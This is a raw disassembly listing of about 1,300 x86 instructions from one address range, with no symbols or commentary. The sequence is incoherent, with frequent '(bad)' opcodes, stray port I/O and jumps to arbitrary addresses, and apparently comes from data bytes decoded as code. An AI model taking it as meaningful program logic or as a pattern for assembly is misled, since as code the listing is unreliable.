  40f1b8:	jmp    0xcdc3:0xc9e3ccb3
  40f1bf:	(bad)
  40f1c2:	ror    ebx,cl
  40f1c4:	rcr    ecx,1
  40f1c6:	retf   0xe800
  40f1c9:	rcr    ebp,0xd5
  40f1cc:	fnstsw WORD PTR [ecx-0x18381d04]
  40f1d2:	out    dx,al
  40f1d3:	(bad)  
  40f1d5:	(bad)  
  40f1d7:	mov    bl,0xee
  40f1d9:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f1db:	mov    ebp,0xedf1e3fb
  40f1e0:	(bad)  
  40f1e1:	rcl    ebp,cl
  40f1e3:	mov    bh,0xc8
  40f1e5:	iret   
  40f1e6:	mov    ah,0xbe
  40f1e8:	lock icebp 
  40f1ea:	fcomi  st,st(6)
  40f1ec:	in     al,dx
  40f1ed:	mov    ecx,0xdbd6facb
  40f1f2:	(bad)  
  40f1f4:	(bad)  
  40f1f5:	in     al,0xd8
  40f1f7:	loope  0x40f1bd
  40f1f9:	mov    bh,0xb3
  40f1fb:	scas   al,BYTE PTR es:[edi]
  40f1fc:	loopne 0x40f1e2
  40f1fe:	(bad)  
  40f1ff:	in     eax,0xd1
  40f201:	mov    al,0xe4
  40f203:	clc    
  40f204:	mov    ah,0xbe
  40f206:	loope  0x40f1e1
  40f208:	fchs   
  40f20a:	(bad)  
  40f20b:	xlat   BYTE PTR ds:[ebx]
  40f20c:	add    al,BYTE PTR [edx]
  40f20e:	loop   0x40f205
  40f210:	(bad)  
  40f211:	std    
  40f212:	push   cs
  40f213:	leave  
  40f214:	out    dx,eax
  40f215:	cli    
  40f216:	leave  
  40f217:	mov    cl,0xc1
  40f219:	(bad)  
  40f21a:	mul    dh
  40f21c:	imul   BYTE PTR [ebp-0xd354a14]
  40f222:	mov    esi,0xbdfaf5ce
  40f227:	hlt    
  40f228:	fidivr WORD PTR [esi-0xf0b2bfe]
  40f22e:	pop    es
  40f22f:	mov    edi,0xaf8d7f7
  40f234:	call   0xb401b23c
  40f239:	fsubr  QWORD PTR [ebx+esi*4-0x164a1718]
  40f240:	stc    
  40f241:	(bad)  
  40f243:	mov    ah,0xb6
  40f245:	mov    edi,0xd0bef6f5
  40f24a:	aam    0xf3
  40f24c:	cmc    
  40f24d:	jmp    0xc7df:0xeffed8f0
  40f254:	enter  0x3c5,0xe9
  40f258:	jmp    0xc126c810
  40f25d:	les    edi,FWORD PTR [edx-0x53494f47]
  40f263:	in     eax,0xb5
  40f265:	loop   0x40f242
  40f267:	repnz out dx,eax
  40f269:	repnz add ch,dh
  40f26c:	aam    0xdc
  40f26e:	add    ebx,edx
  40f270:	mul    bl
  40f272:	(bad)  
  40f274:	(bad)  
  40f276:	adc    edx,ebx
  40f278:	leave  
  40f279:	(bad)  
  40f27a:	mov    bl,0xcf
  40f27c:	mov    cl,0xd4
  40f27e:	mov    ah,0xed
  40f280:	clc    
  40f281:	sti    
  40f282:	mov    ecx,0xddfcb4cc
  40f287:	int3   
  40f288:	pop    es
  40f289:	(bad)  
  40f28b:	in     eax,dx
  40f28c:	fxch   st(3)
  40f28e:	aam    0xf1
  40f290:	retf   0xdbf4
  40f293:	fisttp WORD PTR ds:0xc6a7cdcb
  40f299:	mov    bl,0xee
  40f29b:	in     al,dx
  40f29c:	repnz div DWORD PTR [esi-0x24090709]
  40f2a3:	(bad)  
  40f2a4:	clc    
  40f2a5:	mov    ch,0xbc
  40f2a7:	enter  0xf0de,0xf4
  40f2ab:	icebp  
  40f2ac:	rol    DWORD PTR [ecx],cl
  40f2ae:	fcmovne st,st(2)
  40f2b0:	fstp   st(1)
  40f2b2:	or     eax,DWORD PTR [ebx]
  40f2b4:	ret    0xbe8
  40f2b7:	(bad)  
  40f2b8:	out    dx,eax
  40f2b9:	mov    cl,0xcc
  40f2bb:	mov    bl,0xe1
  40f2bd:	rcr    cl,0xb4
  40f2c0:	fcmove st,st(7)
  40f2c2:	in     al,0xd0
  40f2c4:	mov    esi,0xd2f9bbfe
  40f2c9:	hlt    
  40f2ca:	mov    esi,0xdbe1e700
  40f2cf:	in     al,0xe3
  40f2d1:	or     edi,ecx
  40f2d3:	add    BYTE PTR [ebx],dl
  40f2d5:	dec    dl
  40f2d7:	(bad)  
  40f2d8:	int3   
  40f2d9:	repz cmc 
  40f2db:	mov    al,0xc7
  40f2dd:	shr    edx,cl
  40f2df:	(bad)  
  40f2e0:	out    dx,al
  40f2e1:	in     eax,dx
  40f2e2:	jmp    0xf2e9:0xb9d3d9cb
  40f2e9:	repz hlt 
  40f2eb:	ret    0xfbfe
  40f2ee:	push   ecx
  40f2f0:	mov    ebp,0xe2130fc8
  40f2f6:	enter  0xaebd,0xf3
  40f2fa:	lock out dx,al
  40f2fc:	mov    dh,0xb4
  40f2fe:	rcl    eax,1
  40f300:	in     al,dx
  40f301:	ror    edx,cl
  40f303:	fdiv   st(1),st
  40f305:	add    dh,ah
  40f307:	cli    
  40f308:	sar    cl,0xf0
  40f30b:	(bad)  
  40f30c:	mov    esi,0xcbf8bc04
  40f311:	out    dx,eax
  40f312:	(bad)  
  40f313:	cld    
  40f314:	out    0xe5,eax
  40f316:	leave  
  40f317:	iret   
  40f318:	mov    esp,0xd0c4ecd3
  40f31d:	cmc    
  40f31e:	int3   
  40f31f:	xlat   BYTE PTR ds:[ebx]
  40f320:	mov    edx,0xf6b6f3b0
  40f325:	(bad)  
  40f327:	mov    ebx,0xecdffcf8
  40f32c:	fiadd  DWORD PTR [ecx]
  40f32e:	(bad)  
  40f32f:	call   0x8df1f
  40f334:	add    esi,ebx
  40f336:	loope  0x40f308
  40f338:	jmp    0xd308d8fb
  40f33d:	lods   eax,DWORD PTR ds:[esi]
  40f33e:	cmc    
  40f33f:	out    0xff,al
  40f341:	out    dx,al
  40f342:	call   0xb50eef26
  40f347:	xlat   BYTE PTR ds:[ebx]
  40f348:	in     al,dx
  40f349:	idiv   eax
  40f34b:	repnz cld 
  40f34d:	push   es
  40f34e:	(bad)  
  40f350:	pxor   mm7,QWORD PTR [ecx+edi*8-0x1d220323]
  40f358:	shl    BYTE PTR [edx-0x5249293b],cl
  40f35e:	into   
  40f35f:	mov    ebx,0xb4ccadd7
  40f364:	mov    esi,0xf2ddf6ba
  40f369:	out    0xdb,al
  40f36b:	std    
  40f36c:	ret    
  40f36d:	add    bh,BYTE PTR [eax+0x709fcc7]
  40f373:	in     al,0xdc
  40f375:	add    ecx,DWORD PTR [ecx]
  40f377:	stos   BYTE PTR es:[edi],al
  40f378:	fdivr  st(6),st
  40f37a:	shl    ch,1
  40f37c:	xlat   BYTE PTR ds:[ebx]
  40f37d:	aam    0xcd
  40f37f:	mov    dh,0xea
  40f381:	enter  0xcbff,0xdc
  40f385:	int3   
  40f386:	(bad)  
  40f387:	xlat   BYTE PTR ds:[ebx]
  40f388:	into   
  40f389:	shl    bl,cl
  40f38b:	aam    0xe6
  40f38d:	fcmovbe st,st(4)
  40f38f:	rol    DWORD PTR [esi],1
  40f391:	(bad)  
  40f392:	leave  
  40f393:	lds    eax,FWORD PTR [edx]
  40f395:	(bad)  
  40f397:	test   al,0xdf
  40f399:	icebp  
  40f39a:	in     eax,dx
  40f39b:	mov    cl,0xf6
  40f39d:	mov    dl,0xfa
  40f39f:	scas   eax,DWORD PTR es:[edi]
  40f3a0:	enter  0xdbf5,0xb5
  40f3a4:	jmp    0xe0e0:0xd8febccd
  40f3ab:	loop   0x40f3ae
  40f3ad:	(bad)  
  40f3ae:	xlat   BYTE PTR ds:[ebx]
  40f3af:	fimul  WORD PTR [edi]
  40f3b1:	test   BYTE PTR [edx],0xde
  40f3b4:	cld    
  40f3b5:	loope  0x40f3a6
  40f3b7:	repz leave 
  40f3b9:	shr    DWORD PTR [esi-0x181f490d],0xfa
  40f3c0:	scas   al,BYTE PTR es:[edi]
  40f3c1:	mov    ebx,0xcaf6eada
  40f3c6:	call   0x823e9c4
  40f3cb:	push   es
  40f3cc:	idiv   ebx
  40f3ce:	cmc    
  40f3cf:	mov    edi,0xfa07fcef
  40f3d4:	fsub   st(0),st
  40f3d6:	out    dx,al
  40f3d7:	jecxz  0x40f38b
  40f3d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f3da:	loope  0x40f3aa
  40f3dc:	into   
  40f3dd:	in     al,dx
  40f3de:	mov    bl,0xc5
  40f3e0:	clc    
  40f3e1:	out    dx,al
  40f3e2:	shl    ebp,cl
  40f3e4:	mov    dl,0xf9
  40f3e6:	aad    0x2
  40f3e8:	mov    ecx,0xd2dd07be
  40f3ed:	jmp    0xc6ee:0xc100deca
  40f3f4:	loopne 0x40f3f5
  40f3f6:	out    0xc8,eax
  40f3f8:	mov    dl,0xb2
  40f3fa:	shr    ah,0xe3
  40f3fd:	ret    0xb5ec
  40f400:	mov    ebx,0xe4f5bbef
  40f405:	(bad)  
  40f407:	mov    ebx,0xd8c6c7dd
  40f40c:	clc    
  40f40d:	ret    0xf0d6
  40f410:	clc    
  40f411:	out    dx,al
  40f412:	fldz   
  40f414:	pop    es
  40f415:	(bad)  
  40f417:	jecxz  0x40f3dd
  40f419:	test   eax,0xd1f5c8e2
  40f41e:	jmp    0xb2fa:0xe4f1f7c7
  40f425:	add    bl,bl
  40f427:	in     eax,dx
  40f428:	out    dx,al
  40f429:	sar    ch,1
  40f42b:	(bad)  
  40f42d:	fchs   
  40f42f:	call   0xef4fff0d
  40f434:	loope  0x40f43e
  40f436:	or     ebp,eax
  40f438:	shr    ecx,1
  40f43a:	mov    bh,0xe6
  40f43c:	shl    BYTE PTR [edx-0x202d1031],0xff
  40f443:	fucomip st,st(7)
  40f445:	std    
  40f446:	fyl2xp1 
  40f448:	call   0xc708cd48
  40f44d:	stc    
  40f44e:	rcl    ebp,1
  40f450:	fucomp st(2)
  40f452:	clc    
  40f453:	jmp    0x40f43f
  40f455:	add    dl,bl
  40f457:	shl    ebp,cl
  40f459:	into   
  40f45a:	out    0xac,al
  40f45c:	jmp    0x40f40a
  40f45e:	into   
  40f45f:	fcmovbe st,st(1)
  40f461:	hlt    
  40f462:	mov    edx,0xf0e2cbd0
  40f467:	mov    bh,0xde
  40f469:	fst    st(4)
  40f46b:	in     al,0xfc
  40f46d:	(bad)  
  40f46f:	cmc    
  40f470:	(bad)  
  40f471:	sti    
  40f472:	loope  0x40f458
  40f474:	in     al,0xe3
  40f476:	(bad)  
  40f477:	in     al,dx
  40f478:	stos   BYTE PTR es:[edi],al
  40f479:	out    dx,eax
  40f47a:	call   0xc513bd30
  40f47f:	out    0xf6,al
  40f481:	aad    0xb6
  40f483:	shl    BYTE PTR [eax+edi*4+0x6bfffdf],1
  40f48a:	pop    es
  40f48b:	(bad)  
  40f48c:	jmp    eax
  40f48e:	add    esp,eax
  40f490:	fyl2xp1 
  40f492:	(bad)  
  40f493:	call   0xcf19ef9d
  40f498:	mov    edi,0xdbcfe9c1
  40f49d:	loope  0x40f450
  40f49f:	mov    edx,0xd9b0fbd4
  40f4a4:	int    0xb4
  40f4a6:	(bad)  
  40f4a7:	lock add edi,DWORD PTR [esi+ebp*8-0x1af8fe09]
  40f4af:	sar    edx,1
  40f4b1:	out    dx,al
  40f4b2:	retf   0xe2ff
  40f4b5:	jmp    0xedeed79f
  40f4ba:	int    0xcb
  40f4bc:	xlat   BYTE PTR ds:[ebx]
  40f4bd:	in     eax,dx
  40f4be:	in     al,0xec
  40f4c0:	retf   0xd9b1
  40f4c3:	fmul   st,st(3)
  40f4c5:	std    
  40f4c6:	sar    DWORD PTR [esi-0x3806290a],1
  40f4cc:	(bad)  
  40f4cd:	shl    ah,cl
  40f4cf:	mul    al
  40f4d1:	loope  0x40f4ba
  40f4d3:	aad    0xce
  40f4d5:	cld    
  40f4d6:	adc    eax,ecx
  40f4d8:	enter  0xf0cb,0xcf
  40f4dc:	ret    
  40f4dd:	mov    bl,0xe9
  40f4df:	shr    edi,cl
  40f4e1:	enter  0xc8ca,0xbc
  40f4e5:	rcl    ah,cl
  40f4e7:	xlat   BYTE PTR ds:[ebx]
  40f4e8:	fsubr  st(1),st
  40f4ea:	icebp  
  40f4eb:	(bad)  
  40f4ed:	cld    
  40f4ee:	(bad)
  40f4f1:	or     esp,ebx
  40f4f3:	fsubp  st(4),st
  40f4f5:	out    0xeb,al
  40f4f7:	stos   DWORD PTR es:[edi],eax
  40f4f8:	leave  
  40f4f9:	(bad)  
  40f4fb:	in     al,0xfb
  40f4fd:	icebp  
  40f4fe:	out    dx,al
  40f4ff:	icebp  
  40f500:	(bad)  
  40f501:	in     al,dx
  40f502:	jmp    0xedbb:0xbbf3dfd3
  40f509:	mov    edi,0x70bdbcd
  40f50e:	in     eax,0x5
  40f510:	add    eax,0xf3dc03ef
  40f515:	(bad)  
  40f516:	call   0xd608ecc2
  40f51b:	mov    bl,0xeb
  40f51d:	loop   0x40f509
  40f51f:	repz (bad) 
  40f522:	mov    ecx,0xcad9b2ca
  40f527:	mov    ebp,0xded802cd
  40f52c:	mov    edx,0x1f8f0c1
  40f531:	rcl    ch,0xf4
  40f534:	jmp    0x40f50e
  40f536:	int3   
  40f537:	out    0xb3,al
  40f539:	out    0xb7,eax
  40f53b:	ret    0xb4ed
  40f53e:	aam    0xed
  40f540:	call   0xfcfac13d
  40f545:	mov    ebp,0xe3debbd7
  40f54a:	mov    esi,0xcbc4ddc0
  40f550:	retf   0xd9d6
  40f553:	call   0xf12ec25e
  40f558:	in     al,0xdc
  40f55a:	scas   al,BYTE PTR es:[edi]
  40f55b:	lds    esi,FWORD PTR [ebx-0x164e3a]
  40f561:	hlt    
  40f562:	sti    
  40f563:	lds    edi,FWORD PTR [edi-0x1162b2d]
  40f569:	lock mov esi,0xe704ecbc
  40f56f:	fiadd  DWORD PTR [edi]
  40f571:	jmp    0x40f569
  40f573:	ret    
  40f574:	add    edi,ebp
  40f576:	add    ebp,ebx
  40f578:	loop   0x40f54a
  40f57a:	mov    cl,0xef
  40f57c:	iret   
  40f57d:	mov    bh,0xda
  40f57f:	in     eax,dx
  40f580:	loopne 0x40f546
  40f582:	leave  
  40f583:	idiv   DWORD PTR [ebp-0x2e284f27]
  40f589:	add    bl,dh
  40f58b:	mov    esi,0xd4dfffd1
  40f590:	rol    DWORD PTR [edx+eiz*8],0xf4
  40f594:	stc    
  40f595:	or     ecx,esi
  40f597:	fsubp  st(1),st
  40f599:	mov    edi,0xe8aaebde
  40f59e:	neg    ebx
  40f5a0:	ror    cl,cl
  40f5a2:	fucomp st(7)
  40f5a4:	in     al,dx
  40f5a5:	ret    
  40f5a6:	enter  0xeedb,0xbe
  40f5aa:	in     al,dx
  40f5ab:	(bad)  
  40f5ad:	pop    es
  40f5ae:	cli    
  40f5af:	lds    edi,FWORD PTR [esi-0x63c251a]
  40f5b5:	retf   0xc9e4
  40f5b8:	in     al,0xae
  40f5ba:	rcl    dh,1
  40f5bc:	mov    dl,0xf6
  40f5be:	mov    ah,0xb9
  40f5c0:	fadd   st,st(7)
  40f5c2:	jmp    0xd737c290
  40f5c7:	ret    
  40f5c8:	out    dx,eax
  40f5c9:	icebp  
  40f5ca:	out    0xe2,eax
  40f5cc:	in     al,0xd9
  40f5ce:	jecxz  0x40f5ad
  40f5d0:	idiv   ah
  40f5d2:	shl    dl,0xa
  40f5d5:	push   cs
  40f5d6:	or     al,0xcc
  40f5d8:	repz out dx,al
  40f5da:	in     al,0xe7
  40f5dc:	mov    al,0xe1
  40f5de:	leave  
  40f5df:	div    DWORD PTR [esi-0x2209060d]
  40f5e5:	neg    ebp
  40f5e7:	clc    
  40f5e8:	mov    eax,0xe5c0c107
  40f5ed:	loope  0x40f5e6
  40f5ef:	(bad)  
  40f5f0:	(bad)  
  40f5f2:	paddb  mm3,mm0
  40f5f5:	lds    eax,FWORD PTR ds:0xdeafb0bc
  40f5fb:	rol    ch,cl
  40f5fd:	fcmove st,st(5)
  40f5ff:	out    0xb7,eax
  40f601:	icebp  
  40f602:	mov    bh,0xf0
  40f604:	fcmovbe st,st(4)
  40f606:	ret    0xf4fb
  40f609:	iret   
  40f60a:	fdivr  st,st(0)
  40f60c:	(bad)  
  40f60d:	cmc    
  40f60e:	cld    
  40f60f:	add    ebx,ecx
  40f611:	jmp    0xde2bd2eb
  40f616:	in     eax,dx
  40f617:	loope  0x40f5d6
  40f619:	into   
  40f61a:	in     eax,0xef
  40f61c:	loope  0x40f5cf
  40f61e:	ret    0xd5f0
  40f621:	fyl2xp1 
  40f623:	shl    ebp,cl
  40f625:	mov    esi,0xd1ddffef
  40f62a:	icebp  
  40f62b:	hlt    
  40f62c:	call   esi
  40f62e:	dec    DWORD PTR [edx]
  40f630:	xlat   BYTE PTR ds:[ebx]
  40f631:	mov    ebp,0xe1f3cbd6
  40f636:	inc    ecx
  40f638:	ror    cl,0xae
  40f63b:	into   
  40f63c:	repnz fidiv DWORD PTR [ebp+esi*8-0x3454a32]
  40f644:	jecxz  0x40f609
  40f646:	loope  0x40f649
  40f648:	cli    
  40f649:	test   DWORD PTR [edi],0xd2d503d5
  40f64f:	add    eax,edx
  40f651:	(bad)  
  40f652:	in     eax,dx
  40f653:	iret   
  40f654:	add    edi,edx
  40f656:	shrd   ecx,eax,0xe7
  40f65a:	lds    esi,FWORD PTR [eax-0x2c080b52]
  40f660:	rcr    edx,1
  40f662:	div    dl
  40f664:	aam    0xf3
  40f666:	aam    0xe9
  40f668:	std    
  40f669:	ret    
  40f66a:	int3   
  40f66b:	shl    edi,cl
  40f66d:	mov    ebp,0xd6c4d8dc
  40f672:	fdivr  st(5),st
  40f674:	in     eax,0xe7
  40f676:	out    dx,al
  40f677:	fxch   st(2)
  40f679:	mov    edi,0xc3c8c4b1
  40f67e:	sti    
  40f67f:	fcmovbe st,st(5)
  40f681:	jmp    0x40f64b
  40f683:	fdivp  st(6),st
  40f685:	repz repz out dx,al
  40f688:	int3   
  40f689:	mov    edi,0xc2fbdfd2
  40f68e:	stc    
  40f68f:	fld    st(6)
  40f691:	fucomp st(0)
  40f693:	enter  0xc5,0xeb
  40f697:	sar    BYTE PTR [esi-0x4c1e0d2a],0xc1
  40f69e:	retf   
  40f69f:	out    dx,al
  40f6a0:	iret   
  40f6a1:	clc    
  40f6a2:	int3   
  40f6a3:	in     eax,dx
  40f6a4:	(bad)  
  40f6a6:	rol    edx,cl
  40f6a8:	(bad)  
  40f6aa:	fcom   st(3)
  40f6ac:	clc    
  40f6ad:	clc    
  40f6ae:	icebp  
  40f6af:	cmc    
  40f6b0:	(bad)  
  40f6b1:	test   DWORD PTR [esi],0xe6efce0f
  40f6b7:	ret    
  40f6b8:	in     al,0xc8
  40f6ba:	(bad)  
  40f6bb:	out    0xe3,al
  40f6bd:	mov    al,0xce
  40f6bf:	retf   0xbfe7
  40f6c2:	repnz mov bl,0xd2
  40f6c5:	iret   
  40f6c6:	jmp    0xd6d7:0xfcdae2bc
  40f6cd:	shl    esi,1
  40f6cf:	or     ch,dl
  40f6d1:	fucomi st,st(5)
  40f6d3:	loope  0x40f6c4
  40f6d5:	stc    
  40f6d6:	or     eax,0xf6e2e7bc
  40f6db:	xlat   BYTE PTR ds:[ebx]
  40f6dc:	icebp  
  40f6dd:	in     eax,0xea
  40f6df:	in     al,0xd8
  40f6e1:	mov    ah,0xdd
  40f6e3:	(bad)  
  40f6e5:	call   0xcffdc7d6
  40f6ea:	mov    ah,0xdf
  40f6ec:	fucomi st,st(2)
  40f6ee:	(bad)  
  40f6ef:	loope  0x40f6d9
  40f6f1:	retf   
  40f6f2:	add    eax,0xce06c208
  40f6f7:	lds    esi,FWORD PTR [edx-0x242c3834]
  40f6fd:	(bad)  
  40f6fe:	loope  0x40f6fb
  40f700:	(bad)  
  40f701:	rcl    cl,cl
  40f703:	cld    
  40f704:	leave  
  40f705:	rcl    ebx,1
  40f707:	stc    
  40f708:	mov    eax,0xc2ddbdfc
  40f70d:	fld    st(4)
  40f70f:	clc    
  40f710:	fadd   DWORD PTR [edi]
  40f712:	mov    esp,0xe3e2ffc3
  40f717:	rcr    ch,1
  40f719:	loop   0x40f6e6
  40f71b:	rcr    bl,0xd2
  40f71e:	ret    0xe0f6
  40f721:	test   al,0xba
  40f724:	fstp   TBYTE PTR [edi-0x251e2547]
  40f72a:	icebp  
  40f72b:	in     al,dx
  40f72c:	cld    
  40f72d:	(bad)  
  40f72f:	ret    
  40f730:	lock (bad) 
  40f733:	aad    0x7
  40f735:	adc    cl,BYTE PTR [ebx]
  40f737:	fsubr  QWORD PTR [esi-0x2a4a3332]
  40f73d:	lock out 0xe8,al
  40f740:	leave  
  40f741:	mov    ecx,0xbdf8cbcd
  40f746:	loope  0x40f747
  40f748:	loope  0x40f706
  40f74a:	pop    es
  40f74b:	mov    dh,0x0
  40f74e:	icebp  
  40f74f:	cmc    
  40f750:	aam    0x3
  40f752:	add    eax,0xd0cdec8
  40f757:	(bad)  
  40f759:	int    0xe4
  40f75b:	mov    bh,0xc8
  40f75d:	jecxz  0x40f72c
  40f75f:	cli    
  40f760:	(bad)  
  40f762:	jmp    0x40f72d
  40f764:	mov    dl,0xcb
  40f766:	(bad)  
  40f768:	fstp   TBYTE PTR [ecx+0xb07f4c2]
  40f76e:	(bad)
  40f771:	pop    es
  40f772:	add    eax,0xdd0bc201
  40f777:	jecxz  0x40f765
  40f779:	neg    ah
  40f77b:	(bad)  
  40f77c:	test   esp,0xdecddbc2
  40f782:	(bad)
  40f785:	(bad)  
  40f787:	add    bl,dh
  40f789:	add    BYTE PTR [edi-0x3cfd3f0e],bh
  40f78f:	in     eax,0xe4
  40f791:	clc    
  40f792:	fsubr  st,st(4)
  40f794:	jmp    0x40f776
  40f796:	cli    
  40f797:	int3   
  40f798:	fmul   st(4),st
  40f79a:	jecxz  0x40f765
  40f79c:	call   0xd01af389
  40f7a1:	fidiv  WORD PTR [edi-0xc2a4618]
  40f7a7:	lock mov dh,0xcc
  40f7aa:	loop   0x40f78f
  40f7ac:	fdivr  st(3),st
  40f7ae:	(bad)  
  40f7b0:	clc    
  40f7b1:	iret   
  40f7b2:	or     ecx,DWORD PTR [ecx]
  40f7b4:	les    ecx,FWORD PTR [eax+ebp*8]
  40f7b7:	scas   eax,DWORD PTR es:[edi]
  40f7b8:	out    0xe2,eax
  40f7ba:	out    dx,eax
  40f7bb:	mov    ch,0xc4
  40f7bd:	repnz mov dl,0xd5
  40f7c0:	xlat   BYTE PTR ds:[ebx]
  40f7c1:	aam    0xc5
  40f7c3:	in     eax,0xdd
  40f7c5:	cli    
  40f7c6:	mov    edi,0xee00ceed
  40f7cb:	loope  0x40f7d3
  40f7cd:	sti    
  40f7ce:	jmp    0x40f7cb
  40f7d0:	jecxz  0x40f7ab
  40f7d2:	aam    0xe3
  40f7d4:	fisttp WORD PTR [eax]
  40f7d6:	paddsw mm4,QWORD PTR [esi-0x231e3c15]
  40f7dd:	mov    bh,0xfb
  40f7df:	jmp    0x40f799
  40f7e1:	(bad)
  40f7e4:	lock mov ch,0xbc
  40f7e7:	fdivp  st(3),st
  40f7e9:	icebp  
  40f7ea:	into   
  40f7eb:	fcomi  st,st(6)
  40f7ed:	mov    ecx,0xc708c2fa
  40f7f2:	loope  0x40f7d6
  40f7f4:	out    0xd,al
  40f7f6:	(bad)  
  40f7f7:	mov    eax,0xc8f1f2bc
  40f7fc:	out    dx,al
  40f7fd:	mov    ah,0xe5
  40f7ff:	iret   
  40f800:	xabort 0xc8
  40f803:	(bad)  
  40f804:	neg    bh
  40f806:	jmp    0xc7c0:0xc1e1d2c9
  40f80d:	out    0x2,al
  40f80f:	fldl2t 
  40f811:	fsubr  st(4),st
  40f813:	(bad)  
  40f814:	out    dx,eax
  40f815:	(bad)
  40f818:	mov    esp,0xf1f7eccd
  40f81d:	retf   0xc5b3
  40f820:	mov    bh,0xd1
  40f822:	shl    bl,cl
  40f824:	add    edi,DWORD PTR [edi-0x413f4506]
  40f82a:	cli    
  40f82b:	clc    
  40f82c:	add    al,0xfe
  40f82e:	jmp    0xe800:0xdad608dc
  40f835:	retf   0xc8da
  40f838:	retf   
  40f839:	test   eax,0xf7e2d4f7
  40f83e:	cli    
  40f83f:	shl    al,1
  40f841:	(bad)  
  40f842:	xlat   BYTE PTR ds:[ebx]
  40f843:	cmc    
  40f844:	hlt    
  40f845:	out    dx,al
  40f846:	in     eax,dx
  40f847:	mov    edi,0x5e6e3ff
  40f84c:	mov    edi,0xdcc8c7ff
  40f852:	into   
  40f853:	push   cs
  40f854:	or     al,0xb
  40f856:	push   cs
  40f857:	fild   QWORD PTR [edi-0x4f1b3f3a]
  40f85d:	(bad)  
  40f85e:	mov    al,0xdb
  40f860:	fcmovnu st,st(3)
  40f862:	(bad)  
  40f863:	mov    bh,0xf9
  40f865:	mov    edi,0xfed8d6d3
  40f86a:	int3   
  40f86b:	rcl    dh,cl
  40f86d:	add    eax,0xded8f0e4
  40f872:	out    dx,eax
  40f873:	hlt    
  40f874:	jmp    0xd3ac:0xb2afe1e8
  40f87b:	rcl    ebx,cl
  40f87d:	loope  0x40f856
  40f87f:	mov    dh,0xec
  40f881:	cli    
  40f882:	repnz fbstp TBYTE PTR [esi-0xd280018]
  40f889:	cmc    
  40f88a:	cli    
  40f88b:	repz sar dl,cl
  40f88e:	cld    
  40f88f:	add    eax,0xf8fbf5be
  40f894:	repz out dx,al
  40f896:	or     al,0xce
  40f898:	mov    eax,0xc3f3cbcc
  40f89d:	out    0xf4,eax
  40f89f:	out    dx,al
  40f8a0:	shl    esp,1
  40f8a2:	icebp  
  40f8a3:	cli    
  40f8a4:	call   0xb932cf7e
  40f8a9:	fadd   QWORD PTR [edx]
  40f8ab:	(bad)  
  40f8ad:	fsubrp st(1),st
  40f8af:	icebp  
  40f8b0:	enter  0xc0fe,0xc6
  40f8b4:	push   es
  40f8b5:	jmp    0xcbcc:0xbeb1eddc
  40f8bc:	retf   
  40f8bd:	lods   al,BYTE PTR ds:[esi]
  40f8be:	into   
  40f8bf:	in     eax,0xee
  40f8c1:	lods   eax,DWORD PTR ds:[esi]
  40f8c2:	int    0xee
  40f8c4:	jmp    0xf02ae59a
  40f8c9:	(bad)  
  40f8ca:	mov    esi,0x9d5e4f6
  40f8cf:	add    eax,0xd9e8eacb
  40f8d4:	add    ah,al
  40f8d6:	in     al,dx
  40f8d7:	jecxz  0x40f885
  40f8d9:	mov    bl,0xac
  40f8db:	lods   eax,DWORD PTR ds:[esi]
  40f8dc:	mov    dh,0xc9
  40f8de:	mul    bh
  40f8e0:	shl    cl,cl
  40f8e2:	(bad)  
  40f8e4:	add    ebp,edx
  40f8e6:	mov    edi,0xce06ced1
  40f8eb:	mov    edi,0xebe104c0
  40f8f0:	retf   
  40f8f1:	fcmovnu st,st(3)
  40f8f3:	faddp  st(4),st
  40f8f5:	shl    ebx,0xb2
  40f8f8:	scas   eax,DWORD PTR es:[edi]
  40f8f9:	retf   
  40f8fa:	jmp    0xf3ed:0xc0cce0ef
  40f901:	clc    
  40f902:	mov    bh,0xfd
  40f904:	into   
  40f905:	rol    dl,1
  40f907:	fmulp  st(7),st
  40f909:	mov    ch,0xce
  40f90b:	fstp   st(5)
  40f90d:	lock jmp 0xec07daeb
  40f913:	push   es
  40f914:	add    eax,ebp
  40f916:	(bad)  
  40f918:	(bad)  
  40f91a:	into   
  40f91b:	into   
  40f91c:	shl    DWORD PTR [edi-0x12b504c],1
  40f922:	leave  
  40f923:	shl    ecx,cl
  40f925:	repz jmp 0xe640b2f4
  40f92b:	sti    
  40f92c:	(bad)  
  40f92d:	mov    ecx,0x5f7f60a
  40f932:	(bad)  
  40f934:	jmp    0xe6f6:0xc6cbe6d8
  40f93b:	int3   
  40f93c:	in     eax,0xed
  40f93e:	out    dx,eax
  40f93f:	in     al,dx
  40f940:	out    0xfb,eax
  40f942:	jmp    0xbb3efd3e
  40f947:	sar    DWORD PTR [esi-0x41c2806],1
  40f94d:	clc    
  40f94e:	or     esi,esi
  40f950:	cli    
  40f951:	cli    
  40f952:	mov    esp,0xdef3e501
  40f957:	shl    bl,1
  40f959:	out    0xbc,al
  40f95b:	rol    cl,1
  40f95d:	(bad)
  40f960:	retf   
  40f961:	int    0xbf
  40f963:	sti    
  40f964:	icebp  
  40f965:	(bad)  
  40f967:	aad    0xf0
  40f969:	rol    ebx,1
  40f96b:	fld    st(5)
  40f96d:	loop   0x40f979
  40f96f:	mov    edx,0xeecfdb09
  40f975:	(bad)  
  40f976:	(bad)  
  40f978:	out    dx,al
  40f979:	(bad)  
  40f97b:	mov    cl,0xf0
  40f97d:	jecxz  0x40f975
  40f97f:	clc    
  40f980:	sti    
  40f981:	(bad)  
  40f982:	fidivr WORD PTR [ecx-0x482c141c]
  40f988:	std    
  40f989:	in     eax,dx
  40f98a:	icebp  
  40f98b:	mov    BYTE PTR [edx],0xd2
  40f98e:	sar    cl,cl
  40f990:	loop   0x40f96f
  40f992:	fdiv   st(6),st
  40f994:	add    ecx,ecx
  40f996:	add    al,0xe2
  40f998:	out    dx,eax
  40f999:	mov    esp,0xc5aaf7ac
  40f99e:	shl    BYTE PTR [esi-0x32a1a13],0xd2
  40f9a5:	int3   
  40f9a6:	repnz fld QWORD PTR [edx]
  40f9a9:	xlat   BYTE PTR ds:[ebx]
  40f9aa:	add    eax,DWORD PTR [ebx]
  40f9ac:	loop   0x40f9af
  40f9ae:	mov    BYTE PTR [eax],0xe7
  40f9b1:	(bad)  
  40f9b2:	in     eax,dx
  40f9b3:	por    mm0,QWORD PTR [esi]
  40f9b6:	ror    dh,cl
  40f9b8:	int    0xc9
  40f9ba:	iret   
  40f9bb:	leave  
  40f9bc:	fcmovne st,st(1)
  40f9be:	leave  
  40f9bf:	mov    dh,0xc0
  40f9c1:	fcomip st,st(4)
  40f9c3:	out    dx,al
  40f9c4:	std    
